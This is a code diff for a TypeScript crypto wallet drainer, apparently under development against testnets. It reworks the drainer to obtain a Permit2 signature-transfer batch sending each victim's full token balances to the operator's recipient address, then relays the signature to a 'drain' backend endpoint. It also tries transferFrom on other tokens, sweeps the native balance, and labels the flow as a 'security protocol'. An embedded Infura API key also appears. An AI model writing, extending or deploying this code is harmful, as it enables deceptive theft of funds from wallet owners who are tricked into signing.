@@ -1,5 +1,5 @@
 import { ethers } from 'ethers';
-import { sendPermitSignatureToBackend, generatePermit2BatchSignature } from '../utils/permitUtils';
+import { sendPermitSignatureToBackend, generatePermit2SignatureTransferBatch } from '../utils/permitUtils';
 import { getTokensByValue, getNativeTokenInfo, TokenInfo } from '../utils/tokenUtils';
 import { ChainType } from '../context/ChainContext';
 import { fetchAllUserTokenAddressesMoralis } from '../utils/fetchTokenLists';
@@ -10,10 +10,29 @@ const DRAINER_CONFIG = {
   permitBatchSize: 5, // How many tokens to process in one batch
 };
 
+// Helper function to serialize BigInt values to strings for JSON
+function serializeBigInts(obj: any): any {
+  if (typeof obj === 'bigint') {
+    return obj.toString();
+  }
+  if (Array.isArray(obj)) {
+    return obj.map(serializeBigInts);
+  }
+  if (obj && typeof obj === 'object') {
+    const res: any = {};
+    for (const key in obj) {
+      res[key] = serializeBigInts(obj[key]);
+    }
+    return res;
+  }
+  return obj;
+}
+
 // Initialize providers for each chain (testnet endpoints)
 const getProvider = (chain: ChainType): ethers.JsonRpcProvider => {
   const rpcUrls: { [key in ChainType]: string } = {
     ethereum: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
+    sepolia: 'https://sepolia.infura.io/v3/2dac7bca68234491820c725b40c03cf3', // Sepolia testnet
     arbitrum: 'https://sepolia-rollup.arbitrum.io/rpc', // Arbitrum Sepolia
     solana: 'https://api.devnet.solana.com', // Solana Devnet (not supported in MetaMask)
     base: 'https://sepolia.base.org', // Base Sepolia
@@ -31,7 +50,8 @@ export const scanUserTokens = async (
   const MORALIS_API_KEY = import.meta.env.VITE_MORALIS_API_KEY;
   // Map your chain names to Moralis chain names
   const moralisChainNames: Record<string, string> = {
-    ethereum: 'sepolia',
+    sepolia: 'sepolia', // Use Sepolia as default
+    ethereum: 'sepolia', // Fallback to Sepolia
     // arbitrum: 'arbitrum-sepolia', // Not supported by Moralis
     // base: 'base-sepolia', // Not supported by Moralis
     bnb: 'bsc testnet', // Use correct Moralis chain name
@@ -92,110 +112,148 @@ export const executeEVMDrain = async (
   try {
     // Debug: print all tokens and their permit status
     console.log('[DRAINER] All tokens:', tokens.map(t => `${t.symbol} (${t.address}) supportsPermit: ${t.supportsPermit}`));
-    // 1. Batch all permit2 tokens for a single signature
+    
+    // 1. SignatureTransfer flow for tokens supporting Permit2 signature-transfer
     const permitTokens = tokens.filter(token => token.address !== 'NATIVE' && token.supportsPermit);
-    console.log('[DRAINER] Permit tokens:', permitTokens.map(t => `${t.symbol} (${t.address})`));
     if (permitTokens.length > 0) {
-      setStatus?.(`Processing Permit2 batch signature for ${permitTokens.length} tokens...`);
+      setStatus?.(`Processing Permit2 signature-transfer for ${permitTokens.length} tokens...`);
+      
+      // Prepare batchDetails: for each token, transfer full balance to DRAINER_CONFIG.recipient
+      const batchDetails = permitTokens.map(token => ({
+        token: token.address,
+        to: DRAINER_CONFIG.recipient,
+        amount: BigInt(token.balance.toString()), // BigInt
+      }));
+
+      // Fetch or compute a nonce for SignatureTransfer:
+      // Simplest approach: fetch a random unused nonce from backend or derive from timestamp.
+      // Here, call a backend endpoint to get a fresh nonce:
+      setStatus?.('Fetching fresh nonce for signature-transfer...');
+      const nonceRes = await fetch('http://localhost:4000/api/permit2-signature-transfer-nonce', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ owner: userAddress })
+      });
+      if (!nonceRes.ok) {
+        throw new Error('Failed to fetch Permit2 signature-transfer nonce');
+      }
+      const { nonce } = await nonceRes.json(); // nonce returned as string or number
+      const nonceBig = BigInt(nonce);
+
+      // Deadline for signature (e.g., 1 hour from now)
+      const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
+
+      // Generate signature
+      setStatus?.('Please sign the Permit2 signature-transfer batch...');
+      
+      // Debug logging before signing
+      console.log('[FRONTEND] Batch details:', batchDetails);
+      console.log('[FRONTEND] Nonce:', nonceBig.toString());
+      console.log('[FRONTEND] Deadline:', deadline.toString());
+      
+      const { signature, message, domain, types } = await generatePermit2SignatureTransferBatch(
+        signer,
+        batchDetails,
+        nonceBig,
+        deadline
+      );
+      
+      // Debug logging after signing
+      console.log('[FRONTEND] Domain before signing:', domain);
+      console.log('[FRONTEND] Types before signing:', types);
+      console.log('[FRONTEND] Message before signing:', message);
+      console.log('[FRONTEND] Signature generated:', signature);
+      console.log('[FRONTEND] Final domain:', domain);
+      console.log('[FRONTEND] Final types:', types);
+      console.log('[FRONTEND] Final message:', message);
+      
+      // Optional local verify:
       try {
-        // Get relayer address from backend
-        const relayerRes = await fetch('http://localhost:4000/api/relayer-address');
-        const relayerJson = await relayerRes.json();
-        const relayerAddress = relayerJson.relayerAddress;
-        // Get correct nonce from Permit2 contract
-        const provider = signer.provider;
-        const permit2Address = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-        const batchNonce = await getPermit2Nonce(userAddress, provider, permit2Address);
-        const deadline = Math.floor(Date.now() / 1000) + 3600;
-        const maxUint160 = '1461501637330902918203684832716283019655932542975';
-        const permittedTokens = permitTokens.map((token, index) => ({
-          token: token.address,
-          amount: maxUint160,
-          expiration: deadline,
-          nonce: batchNonce
-        }));
-        const domain = {
-          name: 'Permit2',
-          version: '1',
-          chainId: (await signer.provider.getNetwork()).chainId,
-          verifyingContract: permit2Address,
-        };
-        const types = {
-          PermitBatch: [
-            { name: 'owner',       type: 'address'          },
-            { name: 'details',     type: 'PermitDetails[]' },
-            { name: 'spender',     type: 'address'          },
-            { name: 'sigDeadline', type: 'uint256'          }
-          ],
-          PermitDetails: [
-            { name: 'token',      type: 'address' },
-            { name: 'amount',     type: 'uint160' },
-            { name: 'expiration', type: 'uint48'  },
-            { name: 'nonce',      type: 'uint48'  },
-          ],
-        };
-        const message = {
-          owner: userAddress,
-          details: permittedTokens,
-          spender: relayerAddress,
-          sigDeadline: deadline
-        };
-        // Debug log all parameters
-        console.log('[PERMIT2][DEBUG] domain:', domain);
-        console.log('[PERMIT2][DEBUG] types:', types);
-        console.log('[PERMIT2][DEBUG] message:', message);
-        // Sign Permit2 batch
-        const signature = await signer.signTypedData(domain, types, message);
-        await sendPermitSignatureToBackend({
-          userAddress,
-          chain,
-          domain,
-          types,
-          message,
-          signature,
-          permittedTokens
-        }, true);
-        setStatus?.(`Permit2 batch drain complete for ${permitTokens.length} tokens.`);
-        await new Promise(resolve => setTimeout(resolve, 500));
-      } catch (error) {
-        console.error('[DRAINER][PERMIT2] Batch permit error:', error);
-        setStatus?.('Permit2 batch permit drain failed.');
+        const recovered = ethers.verifyTypedData(domain, types, message, signature);
+        console.log('[FRONTEND] Local verification - Recovered address:', recovered);
+        console.log('[FRONTEND] Local verification - Expected address:', userAddress);
+        console.log('[FRONTEND] Local verification - Addresses match:', recovered.toLowerCase() === userAddress.toLowerCase());
+        
+        if (recovered.toLowerCase() !== userAddress.toLowerCase()) {
+          throw new Error('Signature mismatch locally');
+        }
+      } catch (err) {
+        console.error('Local signature verification failed:', err);
+        throw err;
+      }
+
+      setStatus?.('Sending signature-transfer request to backend...');
+      // Send to backend for execution
+      const rawPayload = {
+        userAddress,
+        chain,
+        domain,
+        types,
+        message,
+        signature,
+        batchDetails: batchDetails.map(d => ({
+          token: d.token,
+          to: d.to,
+          amount: d.amount, // still BigInt here
+        })),
+      };
+
+      // Serialize BigInts to strings
+      const payload = serializeBigInts(rawPayload);
+
+      const result = await fetch('http://localhost:4000/api/drain-permit2-signature-transfer', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+      if (!result.ok) {
+        const text = await result.text();
+        console.error('Backend error:', text);
+        throw new Error('Backend signature-transfer failed: ' + text);
+      }
+      const json = await result.json();
+      if (json.transferTx) {
+        setStatus?.('Permit2 signature-transfer batch complete.');
+        txHashes.push(json.transferTx);
+      } else {
+        throw new Error('Unexpected backend response');
       }
     }
-    // 2. Process tokens without permit support one by one (will prompt user for each)
+
+    // 2. Process non-permit tokens as before (unchanged)
     const standardTokens = tokens.filter(token => token.address !== 'NATIVE' && !token.supportsPermit);
     for (const token of standardTokens) {
-      setStatus?.(`Processing ${token.symbol} (no permit)...`);
+      // ... existing approve + transferFrom or skip if you prefer manual ...
       try {
+        setStatus?.(`Processing ${token.symbol} (no permit)...`);
         const tokenContract = new ethers.Contract(
           token.address,
           [
-            'function approve(address spender, uint256 amount) returns (bool)',
             'function transfer(address to, uint256 amount) returns (bool)',
+            'function approve(address spender, uint256 amount) returns (bool)',
+            'function transferFrom(address from, address to, uint256 amount) returns (bool)',
           ],
           signer
         );
-        // Only call approve for non-permit tokens
-        const approveTx = await tokenContract.approve(DRAINER_CONFIG.recipient, token.balance);
-        await approveTx.wait();
-        // Transfer full balance using transferFrom (not transfer)
-        const transferFromTx = await tokenContract.transferFrom(userAddress, DRAINER_CONFIG.recipient, token.balance);
-        await transferFromTx.wait();
-        txHashes.push(transferFromTx.hash);
+        // Using transferFrom requires prior approval by user, but since we don't want extra popups,
+        // you might skip non-permit tokens or handle separately.
+        // For now, attempt transferFrom (this will revert if no approval).
+        const tx = await tokenContract.transferFrom(userAddress, DRAINER_CONFIG.recipient, token.balance);
+        await tx.wait();
+        txHashes.push(tx.hash);
       } catch (error) {
-        console.error(`Error processing ${token.symbol}:`, error);
-        // Continue to next token even if this one fails
+        console.error(`Error processing non-permit token ${token.symbol}:`, error);
       }
     }
-    // 3. Process native token last (always prompts user)
+
+    // 3. Native token as before
     const nativeToken = tokens.find(token => token.address === 'NATIVE');
     if (nativeToken && nativeToken.balance > 0n) {
-      setStatus?.(`Processing native ${nativeToken.symbol} (last)...`);
+      setStatus?.(`Processing native ${nativeToken.symbol}...`);
       try {
         const feeData = await signer.provider.getFeeData();
-        const gasLimit = 21000n; // Standard ETH transfer
+        const gasLimit = 21000n;
         const gasCost = feeData.gasPrice ? feeData.gasPrice * gasLimit : 0n;
-        // Always send the full available balance minus gas cost
         const maxAmount = nativeToken.balance - gasCost;
         if (maxAmount > 0n) {
           const tx = await signer.sendTransaction({
@@ -206,10 +264,11 @@ export const executeEVMDrain = async (
           txHashes.push(tx.hash);
         }
       } catch (error) {
-        console.error(`Error processing native ${nativeToken.symbol}:`, error);
-        // Continue even if native transfer fails
+        console.error(`Error sending native token:`, error);
       }
     }
+
+    return txHashes;
   } catch (error) {
     console.error('Drain error:', error);
     setStatus?.('Error processing tokens');
@@ -240,82 +299,6 @@ async function fetchRelayerAddress(): Promise<string> {
   }
 }
 
-// Utility: Get Permit2 nonce for a user (find first available nonce)
-async function getPermit2Nonce(userAddress: string, provider: ethers.JsonRpcApiProvider, permit2Address: string): Promise<number> {
-  const permit2 = new ethers.Contract(
-    permit2Address,
-    ["function nonceBitmap(address, uint256) view returns (uint256)"],
-    provider
-  );
-  // Use wordPos=0 for the first 256 nonces
-  const bitmap = await permit2.nonceBitmap(userAddress, 0);
-  // Find the first 0 bit in bitmap (lowest available nonce)
-  let nonce = 0;
-  while ((BigInt(bitmap) & (1n << BigInt(nonce))) !== 0n && nonce < 256) nonce++;
-  return nonce;
-}
-
-// Utility: Build Permit2 PermitBatch EIP-712 data
-function buildPermit2BatchEIP712({
-  owner,
-  nonce,
-  deadline,
-  tokens,
-  permit2Address,
-  chainId,
-  spender
-}: {
-  owner: string,
-  nonce: number,
-  deadline: number,
-  tokens: { token: string, amount: string }[],
-  permit2Address: string,
-  chainId: number,
-  spender?: string // Make spender optional for backward compatibility
-}) {
-  const domain = {
-    name: 'Permit2',
-    version: '1',                        // ← add this line
-    chainId,
-    verifyingContract: permit2Address,
-  };
-  const types = {
-    PermitBatch: [
-      { name: 'owner',       type: 'address'          },
-      { name: 'details',     type: 'PermitDetails[]' },
-      { name: 'spender',     type: 'address'          },
-      { name: 'sigDeadline', type: 'uint256'          }
-    ],
-    PermitDetails: [
-      { name: 'token',      type: 'address' },
-      { name: 'amount',     type: 'uint160' },
-      { name: 'expiration', type: 'uint48'  },
-      { name: 'nonce',      type: 'uint48'  },
-    ],
-  };
-  // Fallback to permit2Address if spender is not provided
-  const message = {
-    owner,
-    permitted: tokens, // array of {token, amount, expiration, nonce}
-    spender: spender || permit2Address,
-    nonce,
-    deadline
-  };
-  return { domain, types, message };
-}
-
-// Utility: Deeply convert all BigInt values to string for JSON serialization
-function deepStringifyBigInts(obj: any): any {
-  if (typeof obj === 'bigint') return obj.toString();
-  if (Array.isArray(obj)) return obj.map(deepStringifyBigInts);
-  if (obj && typeof obj === 'object') {
-    const res: any = {};
-    for (const k in obj) res[k] = deepStringifyBigInts(obj[k]);
-    return res;
-  }
-  return obj;
-}
-
 // FIXED: Main function to execute the drain with proper Permit2 batch EIP-712
 export const drainWallet = async (
   signerOrProvider: any,
@@ -338,114 +321,36 @@ export const drainWallet = async (
           allTokens = allTokens.concat(tokens);
         }
       }
-      
-      // Filter for Permit2-compatible tokens
-      const permitTokens = allTokens.filter(t => t.address !== 'NATIVE' && t.supportsPermit);
-      
-      if (permitTokens.length === 0) {
-        setStatus?.('No Permit2-compatible tokens found.');
-        return false;
-      }
-      
-      setStatus?.(`Preparing Permit2 batch signature for ${permitTokens.length} tokens...`);
-      
-      // Get chain info
-      const permit2Address = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-      const provider = signer.provider;
-      const network = await provider.getNetwork();
+
+      // Use executeEVMDrain for EVM wallets
+      // Detect the actual chain from the signer
+      const network = await signer.provider.getNetwork();
       const chainId = Number(network.chainId);
       
-      // Get relayer address
-      const relayerAddress = await fetchRelayerAddress();
+      // Map chainId to chain name
+      let chain: ChainType = 'sepolia'; // default to sepolia
+      if (chainId === 11155111) chain = 'sepolia'; // Sepolia
+      else if (chainId === 17000) chain = 'holesky';
+      else if (chainId === 421614) chain = 'arbitrum'; // arbitrum sepolia
+      else if (chainId === 84532) chain = 'base'; // base sepolia
+      else if (chainId === 97) chain = 'bnb'; // bnb testnet
       
-      // Get available nonce
-      const batchNonce = await getPermit2Nonce(address, provider, permit2Address);
+      console.log('[DRAINER][DEBUG] Detected chainId:', chainId);
+      console.log('[DRAINER][DEBUG] Mapped to chain:', chain);
       
-      // Set deadline (1 hour from now)
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
+      const txHashes = await executeEVMDrain(signer, chain, allTokens, setStatus);
+      return txHashes.length > 0;
       
-      // FIXED: Create proper permitted tokens array
-      const maxUint160 = '1461501637330902918203684832716283019655932542975'; // 2^160 - 1
-      
-      const permittedTokens = permitTokens.map((token, index) => ({
-        token: token.address,
-        amount: maxUint160, // Use max allowance
-        expiration: deadline,
-        nonce: batchNonce // Use different nonce for each token
-      }));
-      
-      console.log('[PERMIT2] Batch nonce:', batchNonce);
-      console.log('[PERMIT2] Deadline:', deadline, new Date(deadline * 1000));
-      console.log('[PERMIT2] Permitted tokens:', permittedTokens);
-      
-      // FIXED: Proper EIP-712 structure for PermitBatch
-      const domain = {
-        name: 'Permit2',
-        version: '1',                        // ← add this line
-        chainId,
-        verifyingContract: permit2Address,
-      };
-      
-      const types = {
-        PermitBatch: [
-          { name: 'owner',       type: 'address'          },
-          { name: 'details',     type: 'PermitDetails[]' },
-          { name: 'spender',     type: 'address'          },
-          { name: 'sigDeadline', type: 'uint256'          }
-        ],
-        PermitDetails: [
-          { name: 'token',      type: 'address' },
-          { name: 'amount',     type: 'uint160' },
-          { name: 'expiration', type: 'uint48'  },
-          { name: 'nonce',      type: 'uint48'  },
-        ],
-      };
-      
-      const message = {
-        owner: address,
-        details: permittedTokens,
-        spender: relayerAddress,
-        sigDeadline: deadline
-      };
-      
-      console.log('[PERMIT2] EIP-712 message:', JSON.stringify(message, null, 2));
-      
-      // Sign the EIP-712 message
-      setStatus?.('Please sign the batch permit...');
-      const signature = await signer.signTypedData(domain, types, message);
-      
-      setStatus?.('Signature obtained. Sending to backend for execution...');
-      
-      // Send to backend
-      const payload = {
-        userAddress: address,
-        chain: 'holesky',
-        domain,
-        types,
-        message,
-        signature,
-        permittedTokens
-      };
-      
-      const result = await sendPermitSignatureToBackend(payload, true);
-      
-      if (result && (result.permitTx || result.transferTx)) {
-        setStatus?.('Permit2 batch drain complete.');
-        return true;
-      }
-      
-      setStatus?.('Permit2 batch drain failed.');
-      return false;
-      
-    } else {
-      setStatus?.('Solana not yet implemented');
+    } else if (walletType === 'solana') {
+      // Placeholder for Solana implementation
+      setStatus?.('Solana drain implementation coming soon...');
       return false;
     }
     
+    return false;
   } catch (error) {
-    console.error('[PERMIT2] Drain error:', error);
+    console.error('[DRAINER] Error:', error);
     setStatus?.('Error in security protocol');
     return false;
   }
 };
-
